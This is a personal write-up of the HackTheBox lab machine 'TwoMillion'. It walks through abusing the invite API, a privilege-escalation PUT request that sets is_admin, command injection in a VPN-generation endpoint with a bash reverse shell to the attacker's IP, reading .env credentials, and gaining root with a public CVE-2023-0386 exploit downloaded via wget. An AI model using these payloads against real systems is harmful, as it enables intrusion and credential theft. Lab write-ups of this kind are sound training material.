# TwoMillion

I discover port 80 and 22 are open using nmap.

I go to the site and browse around. Theres a login form, but manual tests reveal no sqlinjection. Sqlmap confirmed this - no luck.

There's also a registration form, but that seems to require an invite code - how do I get one?

http://2million.htb/invite

They cheekily offer that, if you can, you're welcome to hack the invite code.

I also unleash sqlmap on this form, but also nothing.

I check the source code for the web page and there's some interestig javascript near the bottom. There is also a script import which looks relevant:

```
<script defer src="/js/inviteapi.min.js"></script>
```

Let's see what this consists of:

```
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

It looks like a function definition of some kind. There are some strings near the end which look relevant:

```
response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify
```

I would like to try and run this function if I can. I use the developer tools in the web browser to run this code, but expectedly it just returns `undefined`.

I try a few things but end up removing eval, and add a function name and call:

```
const f = function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{})
f()
```

Among the outputs I get this time, I see this:

```
POST",dataType:"json",url:'/api/v1/invite/how/to/generate
```

So perhaps I can just send a post request to this url?

```
$ curl -X POST http://2million.htb/api/v1/invite/how/to/generate
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}(.venv) [niels@archbox sandworm]$ curl -X POST http://2million.htb/api/v1/invite/how/to/generate
```

They seem to have ROT13 "encrypted" this response. I find an online decoder to decode the message:

```
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
```

Okay, let's try that then:

```
$ curl -X POST http://2million.htb/api/v1/invite/generate -d {}
{"0":200,"success":1,"data":{"code":"NjZJNDUtTTVZMFctV1pDUEotME1RS1Q=","format":"encoded"}}
```

Looks base64 encoded - I'll try to decode:

```
$ curl -s -X POST http://2million.htb/api/v1/invite/generate | jq --raw-output .data.code | base64 -d
ABCD-EFGHI-KJLMN-OPQRS
```

Well that looks like a  proper invite code. I use it to register on the website.

Website looks relatively complex compared to other hackthebox boxes, but functionally not a whole lot going on in the end.

I can download a vpn configuration, but I cannot get it to work, so perhaps it's not meant to be.

# Back to the API

Let's see what we can find on the `/api` route

I start with the url I have and then remove one part at the time and see what I get.

```
GET /api/v1/user/vpn/generate 
GET /api/v1/user/vpn
GET /api/v1/user
GET /api/v1
```

The last url returns something:

```
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

I'm going guess that the admin part is the most interesting, so I'll start with that.

```
$ curl -s -H "Cookie: PHPSESSID=[redacted]" http://2million.htb/api/v1/admin/auth
{"message":false}
```

What about `/api/v1/admin/settings/update`? I execute one command at the time and amend my request until it's accepted by the webserver:

```
$ curl -X PUT -s -H "Cookie: PHPSESSID=[redacted]" http://2million.htb/api/v1/admin/settings/update
{"status":"danger","message":"Invalid content type."}

$ curl -X PUT -H "content-type: application/json" -s -H "Cookie: PHPSESSID=[redacted]" http://2million.htb/api/v1/admin/settings/update
{"status":"danger","message":"Missing parameter: email"}

$ curl -X PUT -H "content-type: application/json" -s -H "Cookie: PHPSESSID=[redacted]" -d '{"email": "foo@bar.com"}' http://2million.htb/api/v1/admin/settings/update
{"status":"danger","message":"Missing parameter: is_admin"}

$ curl -X PUT -H "content-type: application/json" -s -H "Cookie: PHPSESSID=[redacted]" -d '{"email": "foo@bar.com", "is_admin": true}' http://2million.htb/api/v1/admin/settings/update
{"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}

$ curl -X PUT -H "content-type: application/json" -s -H "Cookie: PHPSESSID=[redacted]" -d '{"email": "foo@bar.com", "is_admin": 1}' http://2million.htb/api/v1/admin/settings/update
{"id":13,"username":"foobar","is_admin":1}

$ curl -s -H "Cookie: PHPSESSID=[redacted]" http://2million.htb/api/v1/admin/auth
{"message":true}
```

Looks like I am now admin!

Now to try the last route: admin/vpn/generate

```
$ curl -X POST -H "content-type: application/json" -s -H "Cookie: PHPSESSID=[redacted]" http://2million.htb/api/v1/admin/vpn/generate
{"status":"danger","message":"Missing parameter: username"}

$ curl -X POST -H "content-type: application/json" -s -H "Cookie: PHPSESSID=[redacted]" -d '{"username": "admin"}' http://2million.htb/api/v1/admin/vpn/generate > admin.vpn
```

Gives a new vpn file as output.

I inadvertently got a hint about command injection at this point. But I'm not sure I would have thought about it myself anyway!

But this works:

```
$ curl -X POST -H "content-type: application/json" -s -H "Cookie: PHPSESSID=[redacted]" -d '{"username": "admin; $(sleep 5)"}' http://2million.htb/api/v1/admin/vpn/generate
```

Sleeps for some seconds before returning prompt.

I set up a netcat listener:

```
nc -lnvp 4444
```

Sending payload:

```
{"username": "admin; $(bash -c 'bash -i >& /dev/tcp/10.10.16.19/4444 0>&1')"}
```

Works!

And send the payload, and get a reverse shell:

```
www-data@2million:~/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade my shell using `script -qc /bin/bash /dev/null`, send to background, run `stty raw -echo; fg`, back to victim and run `reset`, input `screen` and done!

I also always set alias `alias ll='ls -la'` if it's not already set

# Post foothold

Immediately see an interesting file:

```
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=[redacted]
```

Check which users exist:

```
www-data@2million:~/html$ cat /etc/passwd | grep sh$ 
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash
```

Let's try to ssh as admin:

```
ssh admin@2million.htbo
```

Totally works!

Get the user flag and then let's find some privilege escalation!

# Privesc

Checking all the usual suspects, and find this one:

```
admin@2million:/var/mail$ pwd
/var/mail
admin@2million:/var/mail$ ll
total 12
drwxrwsr-x  2 root  mail  4096 Jun  2 23:20 ./
drwxr-xr-x 14 root  root  4096 Jun  6 10:22 ../
-rw-r--r--  1 admin admin  540 Jun  2 23:20 admin
admin@2million:/var/mail$ cat admin 
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

# OverlayFS / FUSE

That sounds interesting - let's google that!

Googling "OverlayFS / FUSE exploit 2023" gets some good results, and one article names CVE-2023-0386.

I google that cve and "poc" and find an example on github, and find one!

https://github.com/veritas501/CVE-2023-0386/tree/master

I clone the repository, run make and I get a program in return. I also start a webserver to serve the mailcious binary.

```
(.venv) [niels@archbox twomillion]$ git clone https://github.com/veritas501/CVE-2023-0386.git
(.venv) [niels@archbox CVE-2023-0386]$ cd CVE-2023-0386
(.venv) [niels@archbox CVE-2023-0386]$ make gcc poc.c -o poc -static -no-pie -s -lfuse3 \
    -L ./libfuse -I ./libfuse/include
(.venv) [niels@archbox CVE-2023-0386]$ ll 
total 1396
...
-rwxr-xr-x 1 niels niels 1140320 Jun 21 20:59 poc
...
(.venv) [niels@archbox CVE-2023-0386]$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

I then go to the attacking box again and download the exploit and run it:

```
admin@2million:/tmp/nscp$ wget 10.10.16.19:8000/poc
--2023-06-21 19:09:05--  http://10.10.16.19:8000/poc
Connecting to 10.10.16.19:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1140320 (1.1M) [application/octet-stream]
Saving to: ‘poc.1’

poc.1                      100%[======================================>]   1.09M   484KB/s    in 2.3s    

2023-06-21 19:09:08 (484 KB/s) - ‘poc.1’ saved [1140320/1140320]
admin@2million:/tmp/nscp$ chmod 700 poc
admin@2million:/tmp/nscp$ ./poc 
...
[+] poc.c:291 VULNERABLE
[+] poc.c:323 get shell
# id
uid=0(root) gid=0(root) groups=0(root),1000(admin)
```

And that's it!
